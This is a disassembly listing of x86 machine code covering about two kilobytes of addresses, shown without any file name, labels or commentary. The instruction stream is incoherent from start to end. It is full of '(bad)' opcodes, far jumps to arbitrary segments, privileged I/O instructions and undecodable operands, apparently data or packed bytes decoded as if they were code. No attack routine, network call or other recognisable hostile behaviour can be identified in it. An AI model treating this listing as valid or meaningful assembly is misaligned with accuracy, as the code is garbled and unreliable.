  4081f5:	dec    ebp
  4081f6:	xchg   ebx,eax
  4081f7:	adc    ch,0x8
  4081fa:	jmp    0x31b4:0x5e3381fa
  408201:	add    al,0xb1
  408203:	sti    
  408204:	ins    BYTE PTR es:[edi],dx
  408205:	xchg   ebx,eax
  408206:	neg    edx
  408208:	xor    eax,0x4313f1b1
  40820d:	je     0x4081a4
  40820f:	neg    bh
  408211:	xor    al,0x35
  408213:	in     al,0x33
  408215:	jb     0x40828c
  408217:	hlt    
  408218:	aaa    
  408219:	add    eax,0x1875bad0
  40821e:	xlat   BYTE PTR ds:[ebx]
  40821f:	or     edx,esi
  408221:	outs   dx,DWORD PTR ds:[esi]
  408222:	popa   
  408223:	jnp    0x4081e8
  408225:	and    bh,BYTE PTR [eax+0x5a2305da]
  40822b:	in     eax,0xa1
  40822d:	adc    al,0xd2
  40822f:	add    bl,dh
  408231:	rol    BYTE PTR [ebx+0x40],1
  408234:	ds data16 addr16 lock mov al,cs:0x60b1
  40823c:	pop    es
  40823d:	xchg   esp,eax
  40823e:	xor    eax,DWORD PTR ds:0x134ee797
  408244:	push   0x3e
  408246:	jbe    0x408281
  408248:	out    dx,eax
  408249:	inc    ebx
  40824a:	stos   BYTE PTR es:[edi],al
  40824b:	lea    ebp,[ebx+0xb]
  40824e:	(bad)  
  40824f:	ret    0x8dcb
  408252:	aas    
  408253:	lds    esp,FWORD PTR [edi+0x6e]
  408256:	sar    DWORD PTR [ebx-0x1f],0x7d
  40825a:	imul   ebp,DWORD PTR [ebp+edi*1+0x40],0xffffffec
  40825f:	inc    ebp
  408260:	sub    DWORD PTR ds:0xe9e674a2,0xa
  408267:	outs   dx,BYTE PTR ds:[esi]
  408268:	dec    edx
  408269:	xor    eax,0x88b71968
  40826e:	xchg   edi,eax
  40826f:	jno    0x40820d
  408271:	fstp   TBYTE PTR [eax+0x68dff831]
  408277:	jbe    0x4082bf
  408279:	fs pop ds
  40827b:	add    ecx,esp
  40827d:	out    0x7c,al
  40827f:	jno    0x408215
  408281:	int    0x6
  408283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408284:	add    al,0x9b
  408286:	dec    eax
  408287:	mov    BYTE PTR [ecx-0x72036b94],al
  40828d:	sub    al,0xb8
  40828f:	push   cs
  408290:	push   es
  408291:	leave  
  408292:	push   edx
  408293:	call   0x3e34:0x8bc40759
  40829a:	in     eax,0x70
  40829c:	out    0x90,al
  40829e:	add    eax,0x9c9b2a68
  4082a3:	xchg   ebx,eax
  4082a4:	adc    BYTE PTR [eax-0x671e9c3e],bh
  4082aa:	les    ecx,FWORD PTR [edi]
  4082ac:	das    
  4082ad:	arpl   WORD PTR [eax],si
  4082af:	dec    esi
  4082b0:	les    ecx,FWORD PTR [edi]
  4082b2:	cli    
  4082b3:	lods   al,BYTE PTR ds:[esi]
  4082b4:	aad    0x31
  4082b6:	ja     0x408270
  4082b8:	lock ja 0x40828c
  4082bb:	aad    0x5
  4082bd:	xchg   edi,eax
  4082be:	mov    dh,BYTE PTR [edx]
  4082c0:	mov    ebx,0xa3e2ca71
  4082c5:	sbb    esi,DWORD PTR [ecx-0x23]
  4082c8:	fwait
  4082c9:	sar    BYTE PTR [edx+0x5d],cl
  4082cc:	jae    0x408337
  4082ce:	jns    0x4082ca
  4082d0:	inc    eax
  4082d1:	xlat   BYTE PTR ds:[ebx]
  4082d2:	cmc    
  4082d3:	xor    eax,0xf206062f
  4082d8:	pop    ebx
  4082d9:	pop    ss
  4082da:	inc    eax
  4082db:	leave  
  4082dc:	retf   0xddeb
  4082df:	addr16 xor al,0x9f
  4082e2:	xchg   esi,eax
  4082e3:	sbb    BYTE PTR [esp+ecx*1-0x692c2045],bh
  4082ea:	pop    ss
  4082eb:	stc    
  4082ec:	ficomp DWORD PTR cs:[ebx-0x34]
  4082f0:	js     0x408368
  4082f2:	sbb    BYTE PTR [eax+0x7dfaf555],cl
  4082f8:	cmp    DWORD PTR [esi-0x2133e82f],edx
  4082fe:	loopne 0x408339
  408300:	jmp    0x5b13:0x18d94267
  408307:	xchg   esi,eax
  408308:	mov    ebx,0x9a58a13f
  40830d:	out    0xfb,eax
  40830f:	cli    
  408310:	aad    0x5
  408312:	pop    es
  408313:	lods   al,BYTE PTR ds:[esi]
  408314:	js     0x40837e
  408316:	cwde   
  408317:	xlat   BYTE PTR ds:[ebx]
  408318:	xlat   BYTE PTR ds:[ebx]
  408319:	or     eax,esi
  40831b:	int    0x17
  40831d:	inc    edi
  40831e:	jns    0x4082e5
  408320:	pop    eax
  408321:	xchg   esi,esi
  408323:	ror    BYTE PTR [esi+0x6b],cl
  408326:	dec    esi
  408327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408328:	lds    ebx,FWORD PTR [edi-0x43754319]
  40832e:	and    DWORD PTR gs:[ecx-0x41],0x35
  408333:	jb     0x4082d2
  408335:	xchg   ecx,eax
  408336:	cs test al,0xc9
  408339:	add    DWORD PTR [edx-0x1db38665],0xa67ed898
  408343:	xchg   ebp,eax
  408344:	mov    bh,BYTE PTR [bx+di-0x19]
  408348:	add    bh,BYTE PTR [edi+0x655bc500]
  40834e:	xor    esp,DWORD PTR [ecx+eiz*2+0x18]
  408352:	fidiv  DWORD PTR [esi]
  408354:	(bad)  
  408355:	inc    esp
  408356:	add    al,0x88
  408358:	(bad)  
  408359:	(bad)  
  40835b:	(bad)  
  40835c:	loopne 0x408356
  40835e:	sub    dh,BYTE PTR [edx-0x6735ce2c]
  408364:	push   ds
  408365:	or     eax,0xb1be434
  40836a:	ja     0x408348
  40836c:	ficomp WORD PTR [ecx+0x2f]
  40836f:	dec    esi
  408370:	jecxz  0x408353
  408372:	adc    al,BYTE PTR [ecx-0x3a8bf59d]
  408378:	ss sub eax,0xde4b16a1
  40837e:	loop   0x408317
  408380:	(bad)  
  408382:	sub    bh,0x4b
  408385:	scas   eax,DWORD PTR es:[edi]
  408386:	xchg   esi,ebx
  408388:	dec    esp
  408389:	leave  
  40838a:	push   ebx
  40838b:	mov    ebx,0x35829176
  408390:	ds cdq 
  408392:	dec    ecx
  408393:	out    dx,al
  408394:	scas   eax,DWORD PTR es:[edi]
  408395:	icebp  
  408396:	sar    DWORD PTR [edx-0x4462902b],0xd8
  40839d:	jle    0x408401
  40839f:	lea    ebp,[edi+0x4a]
  4083a2:	dec    esp
  4083a3:	out    0xbc,al
  4083a5:	sub    BYTE PTR ds:0xe05aa1e8,cl
  4083ab:	sub    eax,0x4a6c8ba4
  4083b0:	leave  
  4083b1:	or     al,0x40
  4083b3:	into   
  4083b4:	fidiv  DWORD PTR [esi]
  4083b6:	push   edi
  4083b7:	lods   al,BYTE PTR ds:[esi]
  4083b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083b9:	sub    al,0xf4
  4083bb:	gs stc 
  4083bd:	and    dl,BYTE PTR [ecx]
  4083bf:	push   ds
  4083c0:	adc    al,0x48
  4083c2:	jl     0x408362
  4083c4:	mov    edx,0x1b9a3a0c
  4083c9:	out    dx,eax
  4083ca:	in     eax,0x8d
  4083cc:	xchg   edx,eax
  4083cd:	push   es
  4083ce:	and    eax,0x34d3edec
  4083d3:	(bad)  
  4083d4:	mov    esi,0x41384782
  4083d9:	dec    edi
  4083da:	sub    dh,0x2a
  4083dd:	lock rcl eax,0x6c
  4083e1:	aaa    
  4083e2:	fisub  WORD PTR [edx+0x44]
  4083e5:	jecxz  0x40845b
  4083e7:	lock outs dx,BYTE PTR ds:[esi]
  4083e9:	cmp    dh,BYTE PTR [edi-0x51b4d66f]
  4083ef:	test   BYTE PTR [ebx+0x5c],bl
  4083f2:	rcr    DWORD PTR [eax-0x19c669cf],1
  4083f8:	call   0x3a76:0x6ea86149
  4083ff:	jge    0x408393
  408401:	mov    edi,0x5c837eb9
  408406:	int3   
  408407:	in     eax,0xe4
  408409:	xchg   esp,eax
  40840a:	outs   dx,BYTE PTR ds:[esi]
  40840b:	rcl    eax,cl
  40840d:	or     edx,DWORD PTR [edi+0x6d]
  408410:	lods   al,BYTE PTR ds:[esi]
  408411:	cmp    ah,ch
  408413:	iret   
  408414:	fimul  DWORD PTR gs:[edx-0x185f29ea]
  40841b:	cmp    BYTE PTR [edx+eax*1+0x76c91dcc],al
  408422:	xchg   ecx,eax
  408423:	sub    eax,0xde318908
  408428:	and    dh,BYTE PTR [ecx+0x87158c9]
  40842e:	mov    eax,0xb4654f30
  408433:	out    dx,eax
  408434:	aaa    
  408435:	imul   ebp,DWORD PTR [edx-0x44],0xbacdec04
  40843c:	mov    eax,ds:0xb5de9ad7
  408441:	ja     0x408430
  408443:	pop    ds
  408444:	or     BYTE PTR [eax+0x7ff2e490],ah
  40844a:	jmp    0x408458
  40844c:	lock inc esp
  40844e:	fbld   TBYTE PTR [edi+ebx*1+0x3e62fbd1]
  408455:	shr    ch,cl
  408457:	xor    eax,0x2f7f7f6a
  40845c:	test   edx,0x7081e515
  408462:	xchg   al,al
  408464:	sub    eax,0xcfeabf03
  408469:	adc    DWORD PTR [eax-0x5d],0xdf26c236
  408470:	fld    QWORD PTR [esi+ecx*1-0x2a]
  408474:	ss push edx
  408476:	mov    ds:0xe2c2349d,eax
  40847b:	lahf   
  40847c:	enter  0x9a26,0x8b
  408480:	dec    ecx
  408481:	sbb    DWORD PTR [esi],0x907ce318
  408487:	inc    ebp
  408488:	mov    ebx,0xce9ec217
  40848d:	outs   dx,BYTE PTR ds:[esi]
  40848f:	icebp  
  408490:	test   BYTE PTR [eax+edi*1],ah
  408493:	mov    ebp,0x305c4452
  408498:	jge    0x4084b9
  40849a:	jbe    0x408495
  40849c:	inc    eax
  40849d:	or     al,0x12
  40849f:	adc    ebx,DWORD PTR [edi+eiz*4+0x63d1dbbe]
  4084a6:	int3   
  4084a7:	mov    bl,0x17
  4084a9:	mov    BYTE PTR [eax-0x35],al
  4084ac:	shl    DWORD PTR [esi+0x14],1
  4084af:	ja     0x4084d0
  4084b1:	inc    ebp
  4084b2:	inc    edi
  4084b3:	add    al,0xbb
  4084b5:	(bad)  
  4084b6:	mov    esp,0x91631fe8
  4084bb:	push   ecx
  4084bc:	fcmovnb st,st(1)
  4084be:	inc    edx
  4084bf:	mov    eax,ds:0x537ff908
  4084c4:	add    al,0x84
  4084c6:	out    dx,al
  4084c7:	repz mov edx,0x5b94cec5
  4084cd:	jge    0x4084d9
  4084cf:	pushf  
  4084d0:	inc    ebp
  4084d1:	dec    esi
  4084d2:	xchg   ebx,eax
  4084d3:	(bad)  
  4084d4:	test   BYTE PTR [ebx+0x61],0xff
  4084d8:	or     cl,BYTE PTR [ebp+eax*1+0xa0ba72c]
  4084df:	loop   0x408499
  4084e1:	int3   
  4084e2:	lds    edx,FWORD PTR [ebx+0x73788020]
  4084e8:	xor    esp,DWORD PTR [edi+0xc3a492e]
  4084ee:	nop
  4084ef:	pop    ss
  4084f0:	imul   eax,DWORD PTR [edi-0x52],0x496133a7
  4084f7:	daa    
  4084f8:	icebp  
  4084f9:	dec    ecx
  4084fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084fb:	jbe    0x4084c4
  4084fd:	and    BYTE PTR [ecx-0x3b],cl
  408500:	loope  0x408536
  408502:	mov    esi,esp
  408504:	(bad)  
  408505:	sahf   
  408506:	mov    eax,ds:0xdc71bc04
  40850b:	jno    0x408579
  40850d:	stos   BYTE PTR es:[edi],al
  40850e:	stc    
  40850f:	dec    esp
  408510:	or     dl,BYTE PTR ds:0x597911a4
  408516:	inc    edi
  408517:	gs jp  0x40855a
  40851a:	xchg   edx,eax
  40851b:	sub    dh,ch
  40851d:	push   0x5c
  40851f:	hlt    
  408520:	mov    eax,ds:0x231ff565
  408525:	and    BYTE PTR [esp+ebx*2+0x337d5ecc],cl
  40852c:	jmp    0x408576
  40852e:	mov    eax,ds:0x584518f8
  408533:	dec    edi
  408534:	xor    eax,eax
  408536:	popa   
  408537:	jmp    0x7e04a28f
  40853c:	fidivr WORD PTR [eax+0x57]
  40853f:	fdiv   QWORD PTR [edx-0x49]
  408542:	in     eax,0x7a
  408544:	push   es
  408545:	pop    eax
  408546:	ins    BYTE PTR es:[edi],dx
  408547:	sub    al,0xb7
  408549:	aas    
  40854a:	js     0x4085a1
  40854c:	les    edx,FWORD PTR [edi]
  40854e:	xchg   BYTE PTR [esi],bl
  408550:	push   es
  408551:	mov    eax,ds:0xb353c4d5
  408556:	pop    es
  408557:	fucomi st,st(6)
  408559:	fsubrp st(5),st
  40855b:	jg     0x40852b
  40855d:	shl    BYTE PTR [ebp+0x6c],1
  408560:	pop    ebp
  408561:	(bad)  
  408562:	aad    0xc4
  408564:	xor    bl,BYTE PTR [esi]
  408566:	ret    
  408567:	mov    WORD PTR [ebx+0x3b172a4c],fs
  40856d:	or     bh,BYTE PTR [edi-0x46]
  408570:	jnp    0x4085c0
  408572:	or     BYTE PTR [esi],dh
  408574:	and    DWORD PTR [ebx+0x8e8e475],eax
  40857a:	pop    ebp
  40857b:	jne    0x40851d
  40857d:	mov    ebx,0x4aba30cd
  408582:	test   al,0x67
  408584:	cs add al,0x77
  408587:	lea    ecx,gs:[ecx-0x6ca27f30]
  40858e:	and    ch,BYTE PTR [ecx-0x12]
  408591:	fstp   QWORD PTR [edx+ebp*4]
  408594:	das    
  408595:	sbb    DWORD PTR [ecx-0x6da02e05],0x210fd7c0
  40859f:	mov    ebx,0x448b3346
  4085a4:	xchg   BYTE PTR [edi],ch
  4085a6:	push   ss
  4085a7:	xor    BYTE PTR [ecx],cl
  4085a9:	or     al,0x9c
  4085ab:	js     0x40854c
  4085ad:	xlat   BYTE PTR ds:[ebx]
  4085ae:	out    dx,al
  4085af:	inc    edi
  4085b0:	pop    ecx
  4085b1:	test   DWORD PTR [edi+0x28],edi
  4085b4:	dec    eax
  4085b5:	add    dl,BYTE PTR [eax+0x4b8880d4]
  4085bb:	into   
  4085bc:	stos   BYTE PTR es:[edi],al
  4085bd:	inc    ebx
  4085be:	sub    BYTE PTR [ebx+0x7fc5c319],dh
  4085c4:	daa    
  4085c5:	cli    
  4085c6:	adc    cl,BYTE PTR [edi+0xc]
  4085c9:	or     BYTE PTR [edx],bl
  4085cb:	int3   
  4085cc:	mov    dh,0xfa
  4085ce:	push   eax
  4085cf:	inc    ecx
  4085d0:	arpl   ax,cx
  4085d2:	shl    DWORD PTR [edx+0x44f02217],cl
  4085d8:	jmp    0xe5dd:0x71f4e0b
  4085df:	xchg   ebp,eax
  4085e0:	sbb    DWORD PTR [edx-0x21],ecx
  4085e3:	ds cli 
  4085e5:	rol    BYTE PTR [ebx-0xc],1
  4085e8:	cmp    dl,bl
  4085ea:	and    eax,0x38aa7ecb
  4085ef:	and    al,0x29
  4085f1:	pop    ecx
  4085f2:	ret    
  4085f3:	nop
  4085f4:	xchg   esi,ebx
  4085f6:	test   ebp,ebp
  4085f8:	sub    al,0x1
  4085fa:	loopne 0x40865e
  4085fc:	js     0x4085ef
  4085fe:	sub    DWORD PTR ds:[edi-0x50c9f3fa],ebx
  408605:	adc    eax,0x2b53bd6e
  40860a:	arpl   WORD PTR [eax+0x3e7aab6f],bx
  408610:	xor    al,0x6d
  408612:	mov    ch,0xd3
  408614:	xchg   ecx,eax
  408615:	xchg   ebp,eax
  408616:	test   BYTE PTR [ebx+0xf9c8afa],bh
  40861c:	mov    ds:0xeb99ab77,al
  408621:	stos   DWORD PTR es:[edi],eax
  408622:	push   ebp
  408623:	hlt    
  408624:	loope  0x4085cf
  408626:	cdq    
  408627:	or     ebp,DWORD PTR [ebx+ecx*2+0x5e2bc266]
  40862e:	jns    0x4085f9
  408630:	jns    0x40865e
  408632:	cmp    edi,DWORD PTR [eax-0x75]
  408635:	inc    ebx
  408636:	fidivr WORD PTR [edx+0x27fdced]
  40863c:	ror    BYTE PTR [eax+ebx*2],cl
  40863f:	adc    al,dl
  408641:	mov    ds:0x8f0ef36b,al
  408646:	mov    edx,0x9125b8bc
  40864b:	std    
  40864c:	fs pop es
  40864e:	ja     0x4085ec
  408650:	push   cs
  408651:	jae    0x4085d8
  408653:	iret   
  408654:	leave  
  408655:	ja     0x40867d
  408657:	add    esp,DWORD PTR [ebx+0x50]
  40865a:	xor    edi,DWORD PTR [ecx-0x2e69571d]
  408660:	cmp    bh,bl
  408662:	or     eax,0x75173cef
  408667:	or     al,0x82
  408669:	or     edi,ebx
  40866b:	mov    ds:0xf11d17e8,eax
  408670:	mov    bl,0xc5
  408672:	fld    QWORD PTR [edx-0x351e0ca3]
  408678:	loope  0x40868e
  40867a:	(bad)  
  40867b:	jnp    0x40861d
  40867d:	sbb    DWORD PTR [ecx],esi
  40867f:	inc    esi
  408680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408681:	into   
  408682:	jmp    0x3b2f:0x788bc9dd
  408689:	xor    dh,BYTE PTR [ebx-0x6c]
  40868c:	sub    BYTE PTR [edx+0x29318a3a],bl
  408692:	xor    cl,BYTE PTR [ecx+0x70368ac1]
  408698:	cmp    BYTE PTR [edx],dl
  40869a:	xchg   edi,eax
  40869b:	jecxz  0x408715
  40869d:	mov    ?,WORD PTR [ebx]
  40869f:	aad    0x42
  4086a1:	ret    0x2da0
  4086a4:	add    DWORD PTR [eax],ecx
  4086a6:	jae    0x4086ec
  4086a8:	sbb    DWORD PTR [esi+edi*2],ebp
  4086ab:	mov    DWORD PTR ds:0x9a16343a,edi
  4086b1:	dec    edx
  4086b2:	xchg   esp,eax
  4086b3:	or     DWORD PTR [eax],edx
  4086b5:	outs   dx,BYTE PTR ds:[esi]
  4086b6:	mov    eax,0x699f0887
  4086bb:	jno    0x408665
  4086bd:	out    0x53,al
  4086bf:	and    eax,0xa0040447
  4086c4:	cld    
  4086c5:	lods   al,BYTE PTR ds:[esi]
  4086c6:	jae    0x408685
  4086c8:	pop    es
  4086c9:	shr    BYTE PTR [esi+0x103b1e11],cl
  4086cf:	cld    
  4086d0:	arpl   ax,si
  4086d2:	cmp    DWORD PTR [ebx-0x1891d72f],ebx
  4086d8:	in     al,0x27
  4086da:	pop    es
  4086db:	adc    eax,0xf868c6d8
  4086e0:	sub    ebx,DWORD PTR [edx-0x521df65a]
  4086e6:	outs   dx,BYTE PTR ds:[esi]
  4086e7:	enter  0x6b1f,0x29
  4086eb:	cmp    DWORD PTR [esi-0x64],esp
  4086ee:	add    DWORD PTR gs:[ecx+edx*4-0x5e],esp
  4086f3:	in     al,0xdc
  4086f5:	xor    eax,0xee9b4540
  4086fa:	aam    0xa1
  4086fc:	xor    bh,BYTE PTR [edx]
  4086fe:	push   0x5504071d
  408703:	(bad)  
  408704:	fucomi st,st(5)
  408706:	rcl    BYTE PTR [esi-0x516beb5c],cl
  40870c:	pop    es
  40870d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40870e:	ds push esp
  408710:	fstp   DWORD PTR [edi]
  408712:	js     0x408702
  408714:	sub    ebx,edi
  408716:	jmp    0x40874d
  408718:	mov    edi,0x65992a1f
  40871d:	addr16 aaa 
  40871f:	aas    
  408720:	fild   QWORD PTR [edi]
  408722:	mov    ecx,0xc27a71f4
  408727:	add    al,0x59
  408729:	(bad)  
  40872a:	inc    ecx
  40872b:	pushf  
  40872c:	in     al,0x29
  40872e:	mov    ecx,gs
  408730:	dec    esi
  408731:	jle    0x40870b
  408733:	sub    al,0xea
  408735:	jmp    0x96ab:0x41034f85
  40873c:	pop    ebp
  40873d:	ret    0x24c0
  408740:	sub    bh,BYTE PTR [ecx-0x74]
  408743:	push   esi
  408744:	nop
  408745:	fs push edx
  408747:	test   eax,0x4393fa84
  40874c:	or     BYTE PTR [ecx+ecx*4+0x11],ch
  408750:	mov    BYTE PTR [ebp+0x7b],cl
  408753:	aas    
  408754:	sti    
  408755:	retf   
  408756:	stos   DWORD PTR es:[edi],eax
  408757:	cdq    
  408758:	cmp    DWORD PTR [edx-0x2c],0x11f79d13
  40875f:	xchg   esi,eax
  408760:	jmp    0xc4b07a11
  408765:	das    
  408766:	mov    ds,WORD PTR [edi+esi*4+0x1143500c]
  40876d:	mov    ebx,0xac3917aa
  408772:	addr16 or al,0x63
  408775:	aas    
  408776:	mov    fs,WORD PTR [edi]
  408778:	rol    ecx,cl
  40877a:	out    dx,al
  40877b:	inc    BYTE PTR [ecx-0x7f3313bf]
  408781:	mov    gs,WORD PTR [edx-0xc]
  408784:	xor    BYTE PTR [eax+0x20cc7a7],cl
  40878a:	(bad)  
  40878b:	xlat   BYTE PTR ds:[ebx]
  40878c:	jge    0x4087c8
  40878e:	mov    esi,0x16b19553
  408793:	mov    ecx,0x3986016f
  408798:	pop    eax
  408799:	call   DWORD PTR cs:[esi]
  40879c:	ja     0x408811
  40879e:	leave  
  40879f:	scas   al,BYTE PTR es:[edi]
  4087a0:	add    eax,DWORD PTR ds:0x58615062
  4087a6:	gs adc al,0x4
  4087a9:	xor    BYTE PTR [edi],bh
  4087ab:	fnstsw WORD PTR [eax+0x18]
  4087ae:	les    ebp,FWORD PTR [edx-0x4c19390e]
  4087b4:	jle    0x408774
  4087b6:	ss adc eax,0x5a817fc0
  4087bc:	or     DWORD PTR [edi],ebx
  4087be:	gs xchg esp,eax
  4087c0:	jle    0x40874c
  4087c2:	mov    BYTE PTR [ebp+0x6099f116],ah
  4087c8:	mov    bl,0xe3
  4087ca:	xor    eax,0xd5ba9c56
  4087cf:	dec    ebx
  4087d0:	xchg   edx,eax
  4087d1:	inc    ecx
  4087d2:	cld    
  4087d3:	dec    esp
  4087d4:	test   al,0xd3
  4087d6:	rcl    BYTE PTR [ebx],cl
  4087d8:	retf   
  4087d9:	jb     0x40880b
  4087db:	icebp  
  4087dc:	lahf   
  4087dd:	mov    edx,0xc11582c
  4087e2:	jl     0x4087b2
  4087e4:	cwde   
  4087e5:	cwde   
  4087e6:	in     eax,0xf
  4087e8:	xor    dh,ah
  4087ea:	sub    eax,0xa4bbdb8e
  4087ef:	cmp    eax,esp
  4087f1:	mov    dl,dh
  4087f3:	sbb    ecx,edi
  4087f5:	cdq    
  4087f6:	dec    esp
  4087f7:	aad    0x6b
  4087f9:	adc    DWORD PTR [ebp-0x2ef475b9],edx
  4087ff:	pop    ebp
  408800:	inc    esi
  408801:	sbb    ah,BYTE PTR [ebx]
  408803:	or     ebx,ecx
  408805:	out    0xaa,al
  408807:	arpl   si,dx
  408809:	loopne 0x40884f
  40880b:	xlat   BYTE PTR ds:[ebx]
  40880c:	ins    DWORD PTR es:[edi],dx
  40880d:	sahf   
  40880e:	bound  ecx,QWORD PTR [ebx-0x2a]
  408811:	addr16 inc edi
  408813:	push   ebx
  408814:	jo     0x4087e8
  408816:	in     al,0xf7
  408818:	dec    ecx
  408819:	jp     0x40882b
  40881b:	dec    edx
  40881c:	fnstenv [ebx-0x25e25225]
  408822:	mov    esp,0x1582d8f8
  408827:	iret   
  408828:	mov    ch,0x1b
  40882a:	mov    ah,0xf7
  40882c:	dec    edx
  40882d:	push   ds
  40882e:	inc    ecx
  40882f:	xor    DWORD PTR [ebp+0xa1e60d3],ecx
  408835:	pop    es
  408836:	adc    DWORD PTR [eax],ebp
  408838:	call   0x6e7bd113
  40883d:	adc    BYTE PTR [ecx+0x16],cl
  408840:	mov    ebx,0xf5b9b20f
  408845:	push   ss
  408846:	aad    0x35
  408848:	adc    esp,ebx
  40884a:	pop    es
  40884b:	mov    esi,0xe41f20f9
  408850:	fld    st(5)
  408852:	add    eax,0x344fc4c8
  408857:	push   ss
  408858:	push   eax
  408859:	xlat   BYTE PTR ds:[ebx]
  40885a:	add    dl,BYTE PTR [ebp+0x6b37f44b]
  408860:	sbb    ch,dh
  408862:	xchg   ebx,eax
  408863:	or     bl,BYTE PTR [ebp-0x38]
  408866:	add    al,0x2b
  408868:	dec    esi
  408869:	pop    eax
  40886a:	sti    
  40886b:	call   0x9924:0xea870792
  408872:	fist   WORD PTR [ecx-0x74748d1]
  408878:	out    0x5c,eax
  40887a:	jmp    0x4cca21f8
  40887f:	aas    
  408880:	mov    bl,0xd2
  408882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408883:	inc    esp
  408884:	dec    edx
  408885:	enter  0xe836,0xc3
  408889:	out    0xc0,al
  40888b:	adc    dh,0xbc
  40888e:	xor    bl,BYTE PTR [ebx+0x66336aa4]
  408894:	or     ch,BYTE PTR ds:0x6074a738
  40889a:	pop    ebx
  40889b:	jns    0x4088cd
  40889d:	push   ebp
  40889e:	jg     0x40891f
  4088a0:	ss jl  0x4088f4
  4088a3:	sub    al,0x6f
  4088a5:	or     ecx,DWORD PTR [esi+ebp*2-0x61]
  4088a9:	das    
  4088aa:	scas   al,BYTE PTR es:[edi]
  4088ab:	clc    
  4088ac:	adc    BYTE PTR [eax+0x47065794],0x9c
  4088b3:	sbb    BYTE PTR [eax],al
  4088b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b6:	loopne 0x40886e
  4088b8:	inc    esi
  4088b9:	and    DWORD PTR [ebx+0x367c80a4],eax
  4088bf:	inc    eax
  4088c0:	sahf   
  4088c1:	daa    
  4088c2:	fild   WORD PTR [edx+0x42]
  4088c5:	loop   0x408870
  4088c7:	and    eax,0x277ec000
  4088cc:	(bad)  
  4088cd:	adc    edi,edi
  4088cf:	push   0xd
  4088d1:	in     eax,dx
  4088d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088d3:	std    
  4088d4:	jnp    0x4088e2
  4088d6:	push   0x33eeda48
  4088db:	les    edi,FWORD PTR [edx-0x295c172d]
  4088e1:	ret    0xf49a
  4088e4:	jmp    0x81087a1d
  4088e9:	cld    
  4088ea:	add    al,0x22
  4088ec:	jae    0x4088d0
  4088ee:	shr    DWORD PTR [eax-0x244ae196],1
  4088f4:	imul   esi,DWORD PTR [eax],0xffffffa5
  4088f7:	xchg   edx,eax
  4088f8:	jbe    0x4088ab
  4088fa:	push   es
  4088fb:	shr    BYTE PTR [ebx-0x1e64d244],1
  408901:	nop    DWORD PTR [ebp+0x532060dc]
  408908:	(bad)  
  408909:	mov    es,WORD PTR [eax-0x21d37b62]
  40890f:	cmp    ecx,DWORD PTR [edx+eiz*1-0x1c]
  408913:	inc    edx
  408914:	pop    ss
  408915:	mov    edx,0xaf3e9bf0
  40891a:	mov    WORD PTR [edx+0x71],?
  40891d:	cmc    
  40891e:	(bad)  
  40891f:	loope  0x408938
  408921:	adc    al,0xa4
  408923:	in     al,dx
  408924:	add    cl,BYTE PTR [ecx-0x68]
  408927:	inc    ebx
  408928:	(bad)  
  40892a:	sub    ah,BYTE PTR [edi]
  40892c:	sub    ebp,esi
  40892e:	mov    esp,0x1f8dea42
  408933:	mov    esi,0x22352a87
  408938:	popa   
  408939:	mov    ebx,0x10504dc7
  40893e:	jno    0x4088ed
  408940:	jl     0x4088de
  408942:	mov    al,ds:0x815c81de
  408947:	or     al,0x5a
  408949:	mov    WORD PTR [eax-0xc],ds
  40894c:	sbb    BYTE PTR [eax-0xd],bl
  40894f:	(bad)  
  408950:	fwait
  408951:	ja     0x408925
  408953:	push   edi
  408954:	and    DWORD PTR [edx+0x30],0xcb11d79e
  40895b:	jecxz  0x40895b
  40895d:	xlat   BYTE PTR ds:[ebx]
  40895e:	cdq    
  40895f:	test   dh,al
  408961:	retf   
  408962:	into   
  408963:	lea    edx,[ebp+0x7f0cbbd9]
  408969:	repz gs loop 0x4088f1
  40896d:	repnz push cs
  40896f:	push   ds
  408970:	mov    ch,0xaf
  408972:	cmp    bl,0xbd
  408975:	and    eax,0x1bef31e7
  40897a:	ds iret 
  40897c:	and    ebp,DWORD PTR [ebp+0x4e]
  40897f:	add    ebx,DWORD PTR [edi]
  408981:	add    bl,ah
  408983:	pop    ss
  408984:	fcom   QWORD PTR [edi-0x55bcd044]
  40898a:	pop    edx
  40898b:	sbb    bl,bl
  40898d:	test   eax,0xbe4a27b5
  408992:	retf   0x1b78
  408995:	ds pop esi
  408997:	and    eax,DWORD PTR [edi-0x7bf7670c]
  40899d:	inc    eax
  40899e:	mov    al,ds:0x55d8d7b1
  4089a3:	mov    esi,0x50c88a1e
  4089a8:	fisubr WORD PTR [edi-0x59bdf285]
  4089ae:	outs   dx,BYTE PTR ds:[esi]
  4089af:	enter  0x99e9,0xb3
  4089b3:	mov    BYTE PTR [ecx+0x334de768],al
  4089b9:	mov    ah,0x6b
  4089bb:	xchg   esi,eax
  4089bc:	pop    edi
  4089bd:	neg    ebp
  4089bf:	(bad)  
  4089c0:	or     dl,BYTE PTR [esi]
  4089c2:	ja     0x4089ff
  4089c4:	dec    ebx
  4089c5:	es mov esp,0xac7346c7
  4089cb:	pop    esi
  4089cc:	fldenv [edi-0x2]
  4089cf:	iret   
  4089d0:	jno    0x4089ea
  4089d2:	jne    0x4089f1
  4089d4:	sub    cl,dl
  4089d6:	push   edx
  4089d7:	sub    eax,0xdea432fe
  4089dc:	sbb    eax,0x86086960
  4089e1:	stc    
  4089e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089e3:	popa   
  4089e4:	shl    DWORD PTR [ecx-0x7ed735f7],0x58
  4089eb:	inc    ebp
  4089ec:	fwait
  4089ed:	mov    cl,0xad
  4089ef:	icebp  
  4089f0:	outs   dx,BYTE PTR ds:[esi]
  4089f1:	cmp    dh,ah
  4089f3:	pop    esi
  4089f4:	jge    0x4089eb
  4089f6:	into   
  4089f7:	js     0x408a16
  4089f9:	pusha  
  4089fa:	dec    ecx
  4089fb:	imul   ebp,DWORD PTR [eax+0x4d255310],0x20
  408a02:	sub    al,0xd8
  408a04:	xchg   ebp,eax
  408a05:	add    al,0x9d
  408a07:	mov    ebp,0x76f1b0b7
  408a0c:	fcomp  DWORD PTR ds:0x8740db52
  408a12:	das    
